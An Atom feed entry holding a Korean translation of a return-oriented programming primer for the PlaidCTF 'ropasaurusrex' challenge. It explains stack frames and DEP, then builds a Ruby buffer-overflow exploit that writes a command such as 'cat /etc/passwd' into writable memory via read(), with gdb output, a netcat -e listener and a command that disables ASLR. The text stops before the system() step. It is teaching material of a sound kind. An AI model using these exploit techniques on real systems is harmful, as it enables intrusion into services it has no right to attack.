<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: CTF | Yous]]></title>
  <link href="http://blog.yous.be/categories/ctf/atom.xml" rel="self"/>
  <link href="http://blog.yous.be/"/>
  <updated>2014-04-01T02:34:53+09:00</updated>
  <id>http://blog.yous.be/</id>
  <author>
    <name><![CDATA[Yous]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[ropasaurusrex: return-oriented programming 입문서]]></title>
    <link href="http://blog.yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming/"/>
    <updated>2014-03-19T20:44:03+09:00</updated>
    <id>http://blog.yous.be/2014/03/19/ropasaurusrex-a-primer-on-return-oriented-programming</id>
    <content type="html"><![CDATA[<p><a href="https://blog.skullsecurity.org">SkullSecurity</a>의 <a href="https://blog.skullsecurity.org/author/ron">Ron Bowes</a>가 쓴 <a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming">return-oriented programming 입문서</a>가 있어 번역했다.</p>

<!-- more -->


<hr />

<p>CTF 대회 중 가장 기분이 나쁠 때는 <a href="http://knowyourmeme.com/memes/captain-hindsight">나중에 깨닫는</a> 문제를 풀 때다. 한 문제에 몇 시간을 보내고 나서&mdash;내가 <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">cnot</a>에 쓴 시간에 비할 바는 아니지만&mdash;사실은 꽤 쉬운 문제라는 걸 깨닫는다. 하지만 역시 골치아프다. 그게 바로 ROP다!</p>

<p>어쨌든, 잘못된 방법으로 많은 시간을 썼음에도 불구하고 (특히, 한동안 <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>을 우회할 생각은 하지 않았다), 우리가 이 문제를 풀기까지 거쳤던 과정(ASLR을 고려하지 않고, 그 다음은 ASLR을 고려해서)은 설명하기 좋은 방법이므로 이 글에서도 같은 방법을 사용하겠다.</p>

<p>먼저, 이 글에서 파트너가 되어 준 HikingPete에게 감사하고 싶다. 그 덕분에 우리는 이 퍼즐을 훨씬 빨리 풀 수 있었고, 잠깐 동안 세계 3위를 차지했다!</p>

<p>우연히, 난 한동안 <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>에 대한 글을 쓸 셈이었다. 심지어 기초가 될 취약한(vulnerable) 데모 프로그램까지 만들고 있었다! 하지만 PlaidCTF에서 문제가 나왔으니 그 데모 대신 이 문제에 대해 말하겠다! 이건 단순한 문제 풀이(writeup)가 아니고, 상당히 상세한 return-oriented programming 입문서가 될 것이다! 만약 CTF 문제를 푸는 과정이 더 궁금하다면, <a href="https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf">내 cnot writeup</a>을 보라. :)</p>

<h2>도대체 ROP가 뭐야?</h2>

<p>ROP&mdash;return-oriented programming&mdash;는 고전적 익스플로잇(exploit) &ldquo;<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return into libc</a>"를 나타내는 현대 용어다. 이 아이디어는 프로그램을 마음대로 조종할 수 있는 오버플로(overflow)나 다른 유형의 취약점을 발견했지만, 코드를 실행 가능한 메모리 영역(executable memory)에 올릴 수 있는 확실한 방법이 없을 때(<a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a>, 데이터 실행 방지(Data Execution Prevention), 사용자가 원하는 곳에서부터 코드를 실행시킬 수 없다)를 위한 것이다.</p>

<p>ROP를 이용하면 실행 가능한 메모리 영역(executable memory)에 이미 있는 코드 중 &lsquo;<a href="https://en.wikipedia.org/wiki/Return_statement">return</a>'으로 끝나는 조각들을 고를 수 있다. 그 조각들이 간단할 때도 있고, 복잡할 때도 있다. 다행히도 이 예제에서 우리는 간단한 것들만 필요하다!</p>

<p>하지만 우린 너무 앞서나가고 있다. 일단 <a href="https://en.wikipedia.org/wiki/Call_stack">스택(stack)</a>에 대해 좀 더 배워보자! 스택을 설명하는 데에 <em>엄청난</em> 시간을 쓰지는 않을 것이니, 잘 모르겠다면 <a href="https://blog.skullsecurity.org/wiki/index.php/The_Stack">내 어셈블리(assembly) 튜토리얼</a><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>을 보라.</p>

<h2>스택</h2>

<p>스택에 관해 한 번쯤은 들어보았을 것이다. <a href="https://en.wikipedia.org/wiki/Stack_overflow">스택 오버플로(stack overflow)</a>? 스택 깨뜨리기(smashing the stack)? 하지만 그게 무슨 뜻인가? 이미 알고 있다면, 이걸 간단한 입문서 정도로 생각하거나 바로 다음 섹션으로 넘어가라. 당신 마음대로!</p>

<p>이 간단한 아이디어를 설명하자면, 함수 <code>A()</code>가 함수 <code>B()</code>를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 <code>B()</code>는 <code>C()</code>를 두 개의 인자 3, 4와 함께 호출한다고 하자. <code>C()</code>가 실행 중일 때, 스택은 이렇게 보일 것이다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          | (높은 주소)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; &lsquo;A'의 스택 프레임 시작
|   [return address]   | &lt;&mdash; 'A'를 호출한 주소
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [frame pointer]    |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [local variables]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; &lsquo;B'의 스택 프레임 시작
|         2 (parameter)|
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         1 (parameter)|
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &lt;&mdash; 'B'가 반환되는 주소
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [frame pointer]    |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [local variables]  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; &lsquo;C'의 스택 프레임 시작
|         4 (parameter)|
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         3 (parameter)|
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &lt;&mdash; 'C'가 반환되는 주소
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          | (낮은 주소)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>당신이 이 수준에서 숨쉬듯이 생각하는 사람이 아니라면 이건 꽤 어려운 (눈을 끄는?) 것이기 때문에 조금 설명하도록 하겠다. 매번 당신이 함수를 호출할 때, 새로운 &ldquo;스택 프레임"이 만들어진다. "프레임"은 단순히 말해 함수가 자신을 위해 스택에 할당한 메모리다. 사실은 할당조차 하지 않으며, 그저 끝에 뭔가 추가하고 <code>esp</code> 레지스터를 업데이트 한다. 그러면 이것이 호출하는 모든 함수는 자신의 스택 프레임이 어디에서 시작해야 하는지 알게 된다(<code>esp</code>, 스택 포인터이며 이는 기본적으로 변수다).</p>

<p>이 스택 프레임은 현재 함수의 상태(context)를 담고 있고, 당신이 쉽게 a) 새로 불린 함수의 프레임을 만들고, b) 이전 프레임으로 돌아갈 수 있게 한다 (예를 들어, 함수에서 반환한 경우). <code>esp</code>(스택 포인터)는 위아래로 움직이지만 항상 스택의 시작점(가장 낮은 주소)을 가리킨다.</p>

<p>다른 함수를 호출했을 때 원래 함수의 지역 변수들은 어디로 가는지 궁금한 적이 있는가 (더 좋게는, 같은 함수를 재귀적으로 한 번 더 호출할 때)? 당연히 없을 것이다! 하지만 생각해 봤다면, 이미 알고 있을 것이다: 우리가 다시 돌아올 예전 스택 프레임에 머무른다!</p>

<p>이제 스택에 무엇이 저장되어 있는지 스택에 들어간 순서대로 보자 (헷갈리지만, 스택을 다른 방법으로 그릴 수도 있다; 이 글에서는 스택이 위에서 아래로 늘어나기에 오래된/호출하는 함수는 위에, 새로운/호출된 함수는 아래에 있다):</p>

<ul>
<li>인자(Parameters): 호출한 함수가 넘긴 인자들&mdash;ROP에서 <em>대단히</em> 중요하다.</li>
<li>반환 주소(Return address): 모든 함수는 자신이 끝나면 어디로 가야 하는지 알아야 한다. 당신이 함수를 호출하면, 그 함수에 진입하기 앞서 호출 직후의 명령어(instruction) 주소가 스택에 들어간다. 반환하는 순간, 그 주소를 스택에서 뽑고, 그리로 점프한다. 이건 ROP에서 대단히 중요하다.</li>
<li>프레임 포인터(Saved frame pointer): 이건 완전히 무시하자. 정말로. 이건 예외는 있지만 컴파일러가 일반적으로 하는 일이고, 이에 대해 다시 언급하지는 않을 것이다.</li>
<li>지역 변수(Local variables): 함수는 지역 변수를 저장하기 위해 필요한 만큼 (적당한 범위 내에서) 메모리를 할당할 수 있다. 지역 변수는 여기서 시작한다. ROP와는 전혀 관계 없으며 무시해도 안전하다.</li>
</ul>


<p>그래서, 요약하자면: 함수가 호출되면 인자들이 스택에 들어가고, 그 뒤에 반환 주소가 들어간다. 함수가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 스택에 들어갔던 인자들은 <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">호출하는 함수에 의해 지워지지만</a>, <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall">예외</a>도 있다. 우리는 호출하는 함수가 인자를 지운다고 가정하자. 즉, 호출된 함수가 자신의 인자를 지우지 않는다고 가정하자. 이건 이 문제가 (그리고 Linux 대부분의 역사에서) 그렇게 동작하기 때문이다.</p>

<h2>천국, 지옥 그리고 스택 프레임</h2>

<p>ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 스택 프레임은 그 함수의 온 우주라는 것이다. 스택은 함수의 신이고, 인자는 성경의 십계명이고, 지역 변수는 죄며, 프레임 포인터는 성경이고 반환 주소는 천국이다 (그래, 지옥일 수도 있다). 모든 건 <a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">인텔의 책</a>, 3장, 19-26구절에 있다 (주: 사실 아니니 보는 수고는 하지 마라).</p>

<p>당신이 <code>sleep()</code> 함수를 호출하고, 첫 라인에 왔다고 하자; 그 스택 프레임은 이렇게 생겼을 것이다:</p>

<p>``` plain</p>

<pre><code>      ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</code></pre>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      [seconds]       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &lt;&mdash; esp는 여기를 가리킨다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<pre><code>      ...            &lt;-- 할당되지 않았다, 영역은 상관 없다. (낮은 주소)
</code></pre>

<p>```</p>

<p><code>sleep()</code>이 시작하는 순간, 스택 프레임은 지금 보이는 게 다다. 이 스택 프레임은 프레임 포인터를 저장할 수도 있고 (젠장, 말 안 하기로 해 놓고 두 번이나 말해버렸다; 다시는 언급하지 않을 것을 맹세한다) <code>esp</code>에서 몇 바이트 뺌으로써 (즉, <code>esp</code> 포인터를 더 낮은 주소로 만듦으로써) 지역 변수를 위한 공간을 확보할 수도 있다. <code>esp</code> 아래에 새 프레임을 만드는 다른 함수를 호출할 수도 있다. 이 스택 프레임은 여러 가지 다양한 일을 할 수 있다; 그게 무엇인지 간에, <code>sleep()</code>이 시작하면, 스택 프레임은 이 함수의 세계를 만들어낸다.</p>

<p><code>sleep()</code>이 반환하면, 결국 이렇게 생겼을 것이다:</p>

<p>``` plain</p>

<pre><code>      ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</code></pre>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      [seconds]       | &lt;&mdash; esp는 여기를 가리킨다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| [old return address] | &lt;&mdash; 할당되지 않았다, 영역은 상관 없다. 이제 여기부터 시작한다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<pre><code>      ...            (낮은 주소)
</code></pre>

<p>```</p>

<p>당연히 호출한 함수는 <code>sleep()</code>이 반환하고 나면 <code>esp</code>에 4를 더해 &ldquo;seconds"를 스택에서 지운다 (나중에 똑같은 일을 하기 위해 어떻게 <code>pop/pop/ret</code>을 사용해야 하는지 이야기할 것이다).</p>

<p>제대로 동작하는 시스템에서는, 이게 작동 원리다. 안전한 전제다. &ldquo;seconds&rdquo; 값은 스택에 들어갔을 때 스택에만 있을 것이고, 반환 주소는 호출된 장소를 가리키고 있을 것이다. 그럼, 그럼. 달리 어떤 방법으로 그리 갈 수 있을까?</p>

<h2>스택 주무르기</h2>

<p>&hellip;뭐, 당신이 궁금해 하니 말하겠다. 우리 모두 &ldquo;스택 오버플로"에 대해 들어봤다. 그건 스택에 있는 변수를 덮어쓰는 것과 관련이 있다. 그게 무슨 뜻이냐? 뭐, 이런 스택 프레임이 있다고 하자:</p>

<p>``` plain</p>

<pre><code>      ...            &lt;-- 모른다, 영역은 상관 없다. (높은 주소)
</code></pre>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      [seconds]       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &lt;&mdash; esp는 여기를 가리킨다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|     char buf[16]     |
|                      |
|                      |
|                      |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<pre><code>      ...            (낮은 주소)
</code></pre>

<p>```</p>

<p>변수 <code>buf</code>의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, <code>buf[16]</code>)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&mdash;<a href="https://en.wikipedia.org/wiki/Endianness">리틀 엔디언</a>&mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. <em>원하는 곳 어디든</em>. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&mdash;완벽한 세계에서는, 그럴 것이다&mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 <a href="https://en.wikipedia.org/wiki/Zero_page">0</a>으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 <code>0x41414141</code>(&ldquo;AAAA&rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&hellip; 음, 이건 좀 복잡해진다&hellip;</p>

<h2>DEP</h2>

<p>전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&mdash;그렇지 않으면, 크래시를 일으킨다.</p>

<p>그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?</p>

<p>음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!</p>

<h2>취약점</h2>

<p>여기 IDA에서 갓 뽑은 취약한 함수다:</p>

<p><code>
.text:080483F4vulnerable_function proc near
.text:080483F4
.text:080483F4buf             = byte ptr -88h
.text:080483F4
.text:080483F4         push    ebp
.text:080483F5         mov     ebp, esp
.text:080483F7         sub     esp, 98h
.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
.text:08048405         lea     eax, [ebp+buf]
.text:0804840B         mov     [esp+4], eax    ; buf
.text:0804840F         mov     dword ptr [esp], 0 ; fd
.text:08048416         call    _read
.text:0804841B         leave
.text:0804841C         retn
.text:0804841Cvulnerable_function endp
</code></p>

<p>어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:</p>

<p><code>c
ssize_t __cdecl vulnerable_function()
{
  char buf[136];
  return read(0, buf, 256);
}
</code></p>

<p>256바이트를 읽어 136바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!</p>

<p>이걸 실행함으로써 쉽게 확인할 수 있다. &lsquo;A&rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:</p>

<p>``` sh
ron@debian-x86 ~ $ ulimit -c unlimited
ron@debian-x86 ~ $ perl -e &ldquo;print &lsquo;A'x300&rdquo; | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
[&hellip;]
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x41414141 in ?? ()</h1>

<p>(gdb)
```</p>

<p>간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(<code>0x41414141</code>=&ldquo;AAAA&rdquo;)로 덮어썼다는 말이다.</p>

<p>이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &ldquo;BBBB"를 넣고 <code>0x42424242</code>("BBBB&rdquo;)에서 크래시를 일으킬 때까지 &lsquo;A'를 지웠다.</p>

<p>``` sh
ron@debian-x86 ~ $ perl -e &ldquo;print &lsquo;A'x140;print 'BBBB&rsquo;&rdquo; | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core</p>

<h1>0  0x42424242 in ?? ()</h1>

<p>```</p>

<p>이걸 좀 더 &ldquo;잘&rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb">pattern_create.rb</a>와 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb">pattern_offset.rb</a>를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.</p>

<h2>익스플로잇 제작 시작하기</h2>

<p>가장 먼저 해야 할 일은 <code>ropasaurusrex</code>를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 <a href="https://en.wikipedia.org/wiki/Xinetd">xinetd</a>를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>을 쓸 것이다.</p>

<p><code>sh
$ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
listening on [any] 4444 ...
</code></p>

<p>이제부터 우리는 <code>localhost:4444</code>를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.</p>

<p>ASLR을 끄고 싶다면:</p>

<p><code>sh
$ sudo sysctl -w kernel.randomize_va_space=0
</code></p>

<p>이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!</p>

<p>초반 익스플로잇을 위한 루비 코드다:</p>

<p>``` ruby
$ cat ./sploit.rb
require &lsquo;socket&rsquo;</p>

<p>s = TCPSocket.new(&ldquo;localhost&rdquo;, 4444)</p>

<h1>Generate the payload</h1>

<p>payload = &ldquo;A&rdquo;*140 +
  [</p>

<pre><code>0x42424242,
</code></pre>

<p>  ].pack(&ldquo;I*&rdquo;) # Convert a series of &lsquo;ints&rsquo; to a string</p>

<p>s.write(payload)
s.close()
```</p>

<p><code>ruby ./sploit.rb</code>를 통해 실행시키면 서비스 크래시를 볼 것이다:</p>

<p><code>sh
connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451
Segmentation fault (core dumped)
</code></p>

<p>그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:</p>

<p>``` sh
gdb &mdash;quiet ./ropasaurusrex core
[&hellip;]
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x42424242 in ?? ()</h1>

<p>```</p>

<p>이게 익스플로잇의 시작이다!</p>

<h2>어떻게 ASLR로 시간을 낭비하는가</h2>

<p>이 섹션을 &lsquo;시간 낭비'라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&mdash;그 때&mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&mdash;실제로, ASLR을 <em>정의</em>조차 하지 말자. 다음 섹션에 나올 것이다.</p>

<p>좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> 공유 라이브러리도 있다. 다음 단계는 뭔가?</p>

<p>음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. <a href="https://en.wikipedia.org/wiki/Standard_streams">stdin과 stdout</a>이 모두 <a href="https://en.wikipedia.org/wiki/Network_socket">소켓</a>에 연결되어 있으므로, 예를 들어 우리가 <code>system("cat /etc/passwd")</code>를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다:</p>

<ol>
<li><code>cat /etc/passwd</code> 문자열을 메모리 어딘가에 넣기</li>
<li><code>system()</code> 함수 실행하기</li>
</ol>


<h3>메모리에 문자열 넣기</h3>

<p>메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:</p>

<ol>
<li>우리가 쓸 수 있는 메모리를 찾기</li>
<li>그 메모리에 쓸 수 있는 함수 찾기</li>
</ol>


<p>무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 <a href="https://en.wikipedia.org/wiki/Data_segment">.data</a> 섹션이다:</p>

<p>``` sh
ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 &lsquo;.data&rsquo;
 23 .data         00000008  08049620  08049620  00000620  2**2</p>

<pre><code>               CONTENTS, ALLOC, LOAD, DATA
</code></pre>

<p>```</p>

<p>오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. <code>objdump -x</code>의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.</p>

<p>``` sh</p>

<p> 20 .dynamic      000000d0  08049530  08049530  00000530  2**2</p>

<pre><code>               CONTENTS, ALLOC, LOAD, DATA
</code></pre>

<p>```</p>

<p>.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 <code>0x08049530</code>을 덮어쓰기로 하자.</p>

<p>다음 단계는 주소 <code>0x08049530</code>에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:</p>

<p>``` sh
ron@debian-x86 ~ $ objdump -R ropasaurusrex</p>

<p>ropasaurusrex:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049600 R_386_GLOB_DAT    <strong>gmon_start</strong>
08049610 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049614 R_386_JUMP_SLOT   write
08049618 R_386_JUMP_SLOT   __libc_start_main
0804961c R_386_JUMP_SLOT   read
```</p>

<p>즉시 사용 가능한 <code>read()</code>와 <code>write()</code>를 찾았다. 이건 유용하다! <code>read()</code> 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:</p>

<p><code>c
ssize_t read(int fd, void *buf, size_t count);
</code></p>

<p>당신이 <code>read()</code> 함수에 진입했을 때, 이런 스택을 원할 것이다:</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          | &ndash; 상관 없다, 다른 함수들이 여기 올 것이다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ &lt;&mdash; read()의 스택 프레임 시작
|     size_t count     | &ndash; count, strlen(&ldquo;cat /etc/passwd&rdquo;)
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|      void *buf       | &ndash; 쓸 수 있는(writable) memory, 0x08049530
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|        int fd        | &ndash; &lsquo;stdin&rsquo; (0)이어야 한다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|   [return address]   | &ndash; &lsquo;read'가 반환할 곳
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
|         &hellip;          | &ndash; 상관 없다, read()가 지역 변수를 위해 사용할 것이다.
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):</p>

<p>``` ruby
$ cat sploit.rb
require &lsquo;socket&rsquo;</p>

<p>s = TCPSocket.new(&ldquo;localhost&rdquo;, 4444)</p>

<h1>The command we&rsquo;ll run</h1>

<p>cmd = ARGV<a href="https://en.wikipedia.org/wiki/Zero_page">0</a> + &ldquo;\0&rdquo;</p>

<h1>From objdump -x</h1>

<p>buf = 0x08049530</p>

<h1>From objdump -D ./ropasaurusrex | grep read</h1>

<p>read_addr = 0x0804832C</p>

<h1>From objdump -D ./ropasaurusrex | grep write</h1>

<p>write_addr = 0x0804830C</p>

<h1>Generate the payload</h1>

<p>payload = &ldquo;A&rdquo;*140 +
  [</p>

<pre><code>cmd.length, # number of bytes
buf,        # writable memory
0,          # stdin
0x43434343, # read's return address

read_addr # Overwrite the original return
</code></pre>

<p>  ].reverse.pack(&ldquo;I*&rdquo;) # Convert a series of &lsquo;ints&rsquo; to a string</p>

<h1>Write the &lsquo;exploit&rsquo; payload</h1>

<p>s.write(payload)</p>

<h1>When our payload calls read() the first time, this is read</h1>

<p>s.write(cmd)</p>

<h1>Clean up</h1>

<p>s.close()
```</p>

<p>공격 대상에 실행해 보자:</p>

<p><code>sh
ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
</code></p>

<p>그리고 크래시를 일으키는 걸 확인해라:</p>

<p><code>sh
listening on [any] 4444 ...
connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456
Segmentation fault (core dumped)
</code></p>

<p>그게 <code>read()</code>의 반환 주소(<code>0x43434343</code>)에서 크래시를 일으켰고 명령어를 메모리 <code>0x08049530</code>에 썼다는 걸 확인해라:</p>

<p>``` sh
$ gdb &mdash;quiet ./ropasaurusrex core
[&hellip;]
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x43434343 in ?? ()</h1>

<p>(gdb) x/s 0x08049530
0x8049530:       &ldquo;cat /etc/passwd&rdquo;
```</p>

<p>완벽하다!</p>

<h3>실행하기</h3>

